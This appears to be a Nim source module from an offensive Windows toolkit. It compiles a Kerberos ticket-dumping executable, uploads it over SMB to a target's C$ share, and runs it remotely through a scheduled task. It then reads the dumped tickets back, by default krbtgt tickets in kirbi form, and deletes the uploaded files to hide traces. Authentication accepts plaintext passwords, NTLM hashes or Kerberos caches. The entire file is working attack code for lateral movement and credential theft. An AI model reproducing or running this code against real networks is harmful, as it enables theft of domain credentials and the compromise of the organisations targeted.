import std/[asyncdispatch, asyncnet, json, os, osproc, random, strutils, times]

import ../smb/client as smb
import ./atexec
import ./transfer as smbtransfer

const ticketSource = staticRead("svc/nimuxtkt.nim")
const crossFlags = " -d:mingw --cpu:i386 --os:windows -d:release --opt:size" &
                   " --cc:gcc --gcc.exe:i686-w64-mingw32-gcc" &
                   " --gcc.linkerexe:i686-w64-mingw32-gcc --passL:-static" &
                   " --mm:arc"

type
  TicketDumpUpdate* = proc(chunk: string) {.closure, gcsafe.}

  TicketDumpEntry* = object
    luid*: string
    user*: string
    client*: string
    server*: string
    kirbiBase64*: string

  TicketDumpResult* = object
    host*: string
    port*: int
    authenticated*: bool
    binaryUploaded*: bool
    executed*: bool
    cleaned*: bool
    success*: bool
    message*: string
    error*: string
    remotePath*: string
    output*: string
    tickets*: seq[TicketDumpEntry]

proc randomToken(): string =
  var rng = initRand(int(getTime().toUnix()) xor cast[int](addr result))
  for _ in 0 ..< 10:
    let c = rng.rand(35)
    if c < 10: result.add chr(ord('0') + c)
    else: result.add chr(ord('a') + (c - 10))

proc buildTicketDumpBinary*(): string =
  let tmp = getTempDir() / "nimux_ticketdump_build_" & $getCurrentProcessId()
  createDir(tmp)
  try:
    let src = tmp / "nimux_ticketdump.nim"
    writeFile(src, ticketSource)
    let exe = tmp / "nimux_ticketdump.exe"
    let cmd = "nim --skipParentCfg:on c" & crossFlags & " --app:console" &
              " --nimcache:" & tmp / "cache" &
              " -o:" & exe & " " & src
    let (output, code) = execCmdEx(cmd)
    if code != 0:
      raise newException(IOError, "ticketdump compile failed:\n" & output)
    result = readFile(exe)
  finally:
    removeDir(tmp)

proc parseTicketDumpOutput*(output: string): seq[TicketDumpEntry] =
  let lines = output.replace("\r\n", "\n").splitLines()
  var i = 0
  while i < lines.len:
    let line = lines[i].strip()
    if line.startsWith("LUID=") and i + 1 < lines.len:
      var entry = TicketDumpEntry()
      let parts = line.splitWhitespace()
      for p in parts:
        if p.startsWith("LUID="): entry.luid = p[5 .. ^1]
        elif p.startsWith("USER="): entry.user = p[5 .. ^1]
        elif p.startsWith("CLIENT="): entry.client = p[7 .. ^1]
        elif p.startsWith("SERVER="): entry.server = p[7 .. ^1]
      entry.kirbiBase64 = lines[i + 1].strip()
      if entry.kirbiBase64.len > 0:
        result.add entry
      inc i, 2
    else:
      inc i

proc quoteWinArg(s: string): string =
  result = "\""
  for c in s:
    if c == '"': result.add "\\\""
    else: result.add c
  result.add "\""

proc pollRemoteOutput(host: string; port, timeoutMs: int;
                      username, password, ntlmHash, domain: string;
                      remotePath: string; seconds, interval: int;
                      authMethod: smb.SmbAuthMethod; ccache: string;
                      krb5Config: string;
                      onUpdate: TicketDumpUpdate): Future[string] {.async.} =
  let credential = smb.SmbCredential(
    username: username, password: password,
    ntlmHash: ntlmHash, domain: domain, ccache: ccache, krb5Config: krb5Config)
  let session = await smb.establishSmbSession(host, port, max(timeoutMs, 8000),
    credential, authMethod)
  if session == nil or not session.authenticated:
    return ""
  let treeId = await smb.connectShareTree(session, "C$")
  if treeId == 0:
    return ""
  let stopAt = epochTime() + float(max(seconds, 1) + max(interval, 1) + 2)
  var emitted = 0
  while true:
    let data = await smbtransfer.readFileIntoMemory(session, treeId, remotePath)
    if data.len > result.len:
      let chunk = data[result.len .. ^1]
      result = data
      if onUpdate != nil and emitted < result.len:
        onUpdate(result[emitted .. ^1])
        emitted = result.len
    if epochTime() >= stopAt:
      break
    await sleepAsync(max(interval, 1) * 1000)
  try: asyncnet.close(session.ctx.socket)
  except CatchableError: discard

proc deleteRemoteFiles(host: string; port, timeoutMs: int;
                       username, password, ntlmHash, domain: string;
                       paths: seq[string];
                       authMethod: smb.SmbAuthMethod; ccache: string;
                       krb5Config: string): Future[bool] {.async.} =
  let credential = smb.SmbCredential(
    username: username, password: password,
    ntlmHash: ntlmHash, domain: domain, ccache: ccache, krb5Config: krb5Config)
  let session = await smb.establishSmbSession(host, port, max(timeoutMs, 5000),
    credential, authMethod)
  if session == nil or not session.authenticated:
    return false
  let treeId = await smb.connectShareTree(session, "C$")
  if treeId == 0:
    try: asyncnet.close(session.ctx.socket) except CatchableError: discard
    return false
  var anyOk = false
  for p in paths:
    try:
      let r = await smbtransfer.deleteFileOnTree(session, treeId, "C$", p)
      anyOk = anyOk or r.success
    except CatchableError:
      discard
  try: asyncnet.close(session.ctx.socket)
  except CatchableError: discard
  result = anyOk

proc dumpTicketsViaTask*(host: string; port, timeoutMs: int;
                         username, password, ntlmHash, domain: string;
                         ticketUser = ""; ticketService = "krbtgt";
                         seconds = 1; interval = 1;
                         authMethod = smb.samNtlm; ccache = "";
                         krb5Config = "";
                         onUpdate: TicketDumpUpdate = nil): Future[TicketDumpResult] {.async.} =
  result.host = host
  result.port = port
  let token = randomToken()
  let remoteName = "netdmp" & token & ".exe"
  let remotePath = "ProgramData\\" & remoteName
  let remoteWin = "C:\\ProgramData\\" & remoteName
  let remoteOutPath = remotePath & ".out"
  let remoteOutWin = remoteWin & ".out"
  result.remotePath = remoteWin

  var exeBytes: string
  try:
    exeBytes = buildTicketDumpBinary()
  except CatchableError as e:
    result.message = e.msg.splitLines()[0]
    result.error = e.msg
    return

  let localExe = getTempDir() / ("nimux_ticketdump_upload_" & token & ".exe")
  try:
    writeFile(localExe, exeBytes)
    let upload = await smbtransfer.putFile(host, port, max(timeoutMs, 8000),
      username, password, ntlmHash, domain, "C$", remotePath, localExe, nil,
      authMethod, ccache, krb5Config)
    result.authenticated = upload.authenticated
    if not upload.success:
      result.message = if upload.error.len > 0: upload.error else: upload.message
      result.error = result.message
      return
    result.binaryUploaded = true

    let cmd = "start \"\" /B " & quoteWinArg(remoteWin) & " " &
      quoteWinArg(ticketUser) & " " & quoteWinArg(ticketService) & " " &
      $seconds & " " & $interval & " " & quoteWinArg(remoteOutWin)
    let exec = await atExec(host, port, max(timeoutMs, 15000),
      username, password, ntlmHash, domain, cmd, authMethod, ccache,
      krb5Config = krb5Config,
      outputPreDelayMs = 0)
    result.authenticated = exec.authenticated
    result.executed = exec.success
    if not exec.success:
      result.message = if exec.error.len > 0: exec.error else: exec.message
      result.error = result.message
      return

    result.output = await pollRemoteOutput(host, port,
      max(timeoutMs, max(15000, (seconds + interval + 10) * 1000)),
      username, password, ntlmHash, domain, remoteOutPath,
      seconds, interval, authMethod, ccache, krb5Config, onUpdate)
    if result.output.len == 0 and exec.output.len > 0:
      result.output = exec.output

    result.tickets = parseTicketDumpOutput(result.output)
    result.success = result.tickets.len > 0
    result.message =
      if result.success: "ticket dump returned " & $result.tickets.len & " ticket(s)"
      else: result.output.strip()
  finally:
    try: removeFile(localExe) except CatchableError: discard
    if result.binaryUploaded:
      try:
        result.cleaned = await deleteRemoteFiles(host, port, max(timeoutMs, 8000),
          username, password, ntlmHash, domain,
          @[remotePath, remoteOutPath], authMethod, ccache, krb5Config)
      except CatchableError:
        discard

proc toJson*(r: TicketDumpResult): JsonNode =
  var arr = newJArray()
  for t in r.tickets:
    arr.add %*{
      "luid": t.luid,
      "user": t.user,
      "client": t.client,
      "server": t.server,
      "kirbi_base64": t.kirbiBase64
    }
  %*{
    "host": r.host,
    "port": r.port,
    "authenticated": r.authenticated,
    "binary_uploaded": r.binaryUploaded,
    "executed": r.executed,
    "cleaned": r.cleaned,
    "success": r.success,
    "message": r.message,
    "error": r.error,
    "remote_path": r.remotePath,
    "tickets": arr,
    "raw_output": r.output
  }
